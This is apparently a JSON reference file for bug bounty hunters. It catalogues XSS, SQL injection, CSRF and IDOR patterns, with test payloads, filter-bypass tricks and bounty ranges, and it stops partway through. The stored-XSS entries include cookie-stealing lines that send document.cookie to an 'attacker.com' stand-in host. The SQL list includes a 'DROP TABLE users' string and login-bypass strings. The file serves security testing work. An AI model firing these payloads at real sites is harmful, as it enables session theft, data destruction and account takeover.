{
  "version": "1.0",
  "description": "Form-specific vulnerability patterns for bounty hunters",
  "vulnerabilities": {
    "xss-reflected": {
      "name": "Reflected Cross-Site Scripting",
      "owasp": "A03",
      "cwe": "CWE-79",
      "severity": "medium",
      "bounty_range": "$500 - $5,000",
      "summary": "User input is immediately returned in the response without proper encoding. Input goes in, executes in victim's browser.",
      "keywords": ["XSS", "reflected XSS", "cross-site scripting", "script injection", "クロスサイトスクリプティング", "反射型XSS"],
      "indicators": [
        "Input value appears in page source unchanged",
        "Search queries displayed on results page",
        "Error messages include user input",
        "No Content-Security-Policy header",
        "Response Content-Type is text/html"
      ],
      "form_targets": [
        "Search forms",
        "Error pages with user input",
        "Login forms (username field)",
        "Contact forms (preview feature)"
      ],
      "test_payloads": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)//",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "<details open ontoggle=alert(1)>"
      ],
      "bypass_techniques": [
        "Case variation: <ScRiPt>",
        "Encoding: &#60;script&#62;",
        "Double encoding: %253Cscript%253E",
        "Breaking tag: <scr<script>ipt>",
        "Event handlers: onerror, onload, onfocus",
        "Protocol: javascript:, data:, vbscript:"
      ],
      "hunter_notes": "Reflected XSS needs user interaction (click link). Stored XSS pays more. Still worth reporting - can chain with other bugs.",
      "url": "https://owasp.org/www-community/attacks/xss/"
    },
    "xss-stored": {
      "name": "Stored Cross-Site Scripting",
      "owasp": "A03",
      "cwe": "CWE-79",
      "severity": "high",
      "bounty_range": "$2,000 - $15,000",
      "summary": "Malicious script is permanently stored on the target server. Every user who views the infected page executes the payload.",
      "keywords": ["stored XSS", "persistent XSS", "second-order XSS", "格納型XSS", "永続的XSS"],
      "indicators": [
        "User-generated content displayed to others",
        "No output encoding on stored data",
        "Comments, profiles, messages visible to multiple users",
        "Admin panels showing user input"
      ],
      "form_targets": [
        "Comment/review forms",
        "User profile fields (name, bio)",
        "Forum posts",
        "Support ticket systems",
        "File names in upload"
      ],
      "test_payloads": [
        "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        "<img src=x onerror=this.src='https://attacker.com/'+document.cookie>",
        "<svg/onload=alert(document.domain)>",
        "Name: <script>alert('XSS')</script>",
        "Bio: <img src=x onerror=alert(1)>"
      ],
      "bypass_techniques": [
        "Payload in unusual fields (filename, metadata)",
        "Bypass client-side validation",
        "Encode for specific context (HTML, JS, URL)",
        "Use less common events: onpointerover, onanimationend"
      ],
      "hunter_notes": "Stored XSS = bigger impact = higher bounty. If it hits admin panel, could be critical. Document the impact clearly.",
      "url": "https://owasp.org/www-community/attacks/xss/"
    },
    "xss-dom": {
      "name": "DOM-based Cross-Site Scripting",
      "owasp": "A03",
      "cwe": "CWE-79",
      "severity": "medium",
      "bounty_range": "$500 - $5,000",
      "summary": "Vulnerability exists in client-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.",
      "keywords": ["DOM XSS", "client-side XSS", "JavaScript XSS", "DOM型XSS", "クライアントサイドXSS"],
      "indicators": [
        "JavaScript uses location.hash, location.search",
        "innerHTML or outerHTML usage with user data",
        "Dynamic code execution with user input",
        "jQuery html() or append() with user data"
      ],
      "form_targets": [
        "Single-page applications",
        "JavaScript-heavy forms",
        "Dynamic content loading",
        "URL fragment handlers"
      ],
      "test_payloads": [
        "#<img src=x onerror=alert(1)>",
        "?name=<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>"
      ],
      "bypass_techniques": [
        "Break out of string context",
        "Use different sinks: setTimeout, setInterval",
        "Prototype pollution to inject",
        "Postmessage handler exploitation"
      ],
      "hunter_notes": "Harder to find but worth it. Use browser dev tools to trace data flow. Check for unsafe jQuery patterns.",
      "url": "https://owasp.org/www-community/attacks/DOM_Based_XSS"
    },
    "sql-injection": {
      "name": "SQL Injection",
      "owasp": "A03",
      "cwe": "CWE-89",
      "severity": "critical",
      "bounty_range": "$5,000 - $50,000+",
      "summary": "Attacker can inject SQL commands through user input to manipulate database queries. Can lead to data theft, modification, or deletion.",
      "keywords": ["SQL injection", "SQLi", "database injection", "blind SQL", "union injection", "SQLインジェクション", "データベース"],
      "indicators": [
        "Error messages revealing SQL syntax",
        "Single quote causes application error",
        "Numeric parameters accepted as strings",
        "Search functionality with complex results"
      ],
      "form_targets": [
        "Login forms (username/password)",
        "Search forms",
        "User lookup by ID",
        "Filtering/sorting parameters",
        "Any form that queries database"
      ],
      "test_payloads": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
        "' AND SLEEP(5)--",
        "' OR 1=1#",
        "1' ORDER BY 1--+"
      ],
      "bypass_techniques": [
        "Case variations: SeLeCt, UnIoN",
        "Comments: /**/SELECT/**/",
        "Encoding: CHAR(39) for quote",
        "Whitespace alternatives: %09, %0a, %0d",
        "Time-based blind: SLEEP(), BENCHMARK()",
        "Boolean-based blind: AND 1=1, AND 1=2"
      ],
      "hunter_notes": "SQLi in login = auth bypass = critical. Data extraction = critical. Even blind SQLi is high severity. Always test for it.",
      "url": "https://owasp.org/www-community/attacks/SQL_Injection"
    },
    "csrf": {
      "name": "Cross-Site Request Forgery",
      "owasp": "A01",
      "cwe": "CWE-352",
      "severity": "medium-high",
      "bounty_range": "$1,000 - $10,000",
      "summary": "Attacker tricks authenticated user into executing unwanted actions. The browser automatically includes cookies, making the forged request look legitimate.",
      "keywords": ["CSRF", "XSRF", "request forgery", "session riding", "クロスサイトリクエストフォージェリ", "CSRF攻撃"],
      "indicators": [
        "No CSRF token in forms",
        "Token is predictable or reusable",
        "Token not validated server-side",
        "No SameSite cookie attribute",
        "State-changing GET requests"
      ],
      "form_targets": [
        "Password change forms",
        "Email change forms",
        "Money transfer forms",
        "Account settings",
        "Admin actions"
      ],
      "test_payloads": [
        "Submit form from different origin",
        "Remove CSRF token, submit form",
        "Use another user's CSRF token",
        "Change request method (POST to GET)",
        "Submit stale/expired token"
      ],
      "bypass_techniques": [
        "Remove token parameter entirely",
        "Send empty token",
        "Use token from different session",
        "Change Content-Type to avoid checks",
        "Flash-based CSRF for complex cases"
      ],
      "hunter_notes": "CSRF on password/email change = account takeover potential. CSRF on admin actions = high severity. Check SameSite cookie setting first.",
      "url": "https://owasp.org/www-community/attacks/csrf"
    },
    "idor": {
      "name": "Insecure Direct Object Reference",
      "owasp": "A01",
      "cwe": "CWE-639",
      "severity": "high-critical",
      "bounty_range": "$2,000 - $50,000+",
      "summary": "Application exposes internal object references (IDs) without proper authorization checks. Attacker can access other users' data by manipulating references.",
      "keywords": ["IDOR", "direct object reference", "horizontal privilege escalation", "authorization bypass", "オブジェクト参照", "認可バイパス"],
      "indicators": [
        "Sequential/predictable IDs in URLs",
        "User ID in form hidden fields",
        "Object IDs in API requests",
        "No ownership validation on access"
      ],
      "form_targets": [
        "Profile edit forms (user_id parameter)",
        "Document download (doc_id)",
        "Order details (order_id)",
        "Invoice access (invoice_id)",
        "Settings forms with object reference"
      ],
      "test_payloads": [
        "Change id=123 to id=124",
        "Increment/decrement numeric IDs",
        "Try id=1 (often admin)",
        "Replace UUID with another user's UUID",
        "Remove ID to see if returns all"
      ],
      "bypass_techniques": [
        "Parameter pollution: id=123&id=124",
        "Different encoding: base64, hex",
        "Wrapped reference: {\"id\": 124}",
        "Array notation: id[]=123&id[]=124",
        "Change HTTP method (GET vs POST)"
      ],
      "hunter_notes": "IDOR with PII exposure = critical. Even accessing non-sensitive data of others is usually high. Check every object reference you see.",
      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
    },
